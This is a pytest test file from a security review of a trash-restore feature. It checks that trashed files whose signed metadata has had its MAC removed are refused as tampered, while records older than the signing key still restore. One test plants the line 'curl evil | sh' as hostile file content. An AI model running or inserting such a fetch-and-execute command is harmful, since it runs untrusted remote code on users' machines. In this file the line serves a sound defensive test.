"""Second security review: a local trash record whose ``mac`` (and
fingerprint) was removed was restored as "unsigned" - an older record - with
whatever data the trash then held. Once this user's sidecar key exists, a
record written after it has a mac: one without is refused like a forged
one. A record older than the key is still an older one."""

from __future__ import annotations

import json
import os
import time
from pathlib import Path

import pytest

from core import extension_code_cache as ECC
from core import trash as T
from core.local_fs import LocalFS


@pytest.fixture
def home(tmp_path, monkeypatch) -> Path:
    real = tmp_path / "home"
    (real / ".config").mkdir(parents=True)
    (real / "proj").mkdir()
    monkeypatch.setenv("HOME", str(real))
    monkeypatch.setattr(ECC, "_SECRET", [], raising=False)
    return real


def _strip(home: Path, tid: str, *fields: str) -> None:
    sidecar = home / T.TRASH_DIRNAME / f"{tid}{T.META_SUFFIX}"
    meta = json.loads(sidecar.read_text())
    for name in fields:
        meta.pop(name, None)
    sidecar.write_text(json.dumps(meta))


@pytest.mark.parametrize("fields", [("mac",), ("mac", "fingerprint")])
def test_sad_a_record_with_its_mac_removed_is_not_restored(home, fields):
    victim = home / "proj" / "build.sh"
    victim.write_text("make\n")
    tid = T.trash(LocalFS(), str(victim))
    (home / T.TRASH_DIRNAME / tid).write_text("curl evil | sh\n")
    _strip(home, tid, *fields)
    with pytest.raises(T.TamperedTrashEntry):
        T.restore(LocalFS(), tid)
    assert not victim.exists()


def test_sad_a_record_moved_elsewhere_with_its_mac_removed_is_not_restored(home):
    victim = home / "proj" / "notes.txt"
    victim.write_text("mine\n")
    tid = T.trash(LocalFS(), str(victim))
    sidecar = home / T.TRASH_DIRNAME / f"{tid}{T.META_SUFFIX}"
    meta = json.loads(sidecar.read_text())
    meta.pop("mac")
    meta["original_path"] = str(home / "proj" / "elsewhere.txt")
    sidecar.write_text(json.dumps(meta))
    with pytest.raises(T.TamperedTrashEntry):
        T.restore(LocalFS(), tid)


def test_happy_a_record_older_than_the_key_is_restored_as_an_older_one(home):
    trash = home / T.TRASH_DIRNAME
    trash.mkdir()
    tid = "0123456789abcdef0123456789abcdef"
    (trash / tid).write_text("old\n")
    (trash / f"{tid}{T.META_SUFFIX}").write_text(json.dumps(
        {"trash_id": tid, "original_path": str(home / "proj" / "old.txt"),
         "trashed_at": "2026-01-01T10:00:00", "size": 4, "is_dir": False}))
    time.sleep(0.01)
    assert ECC._secret()   # the key is made after the record
    assert T.restore(LocalFS(), tid) == str(home / "proj" / "old.txt")
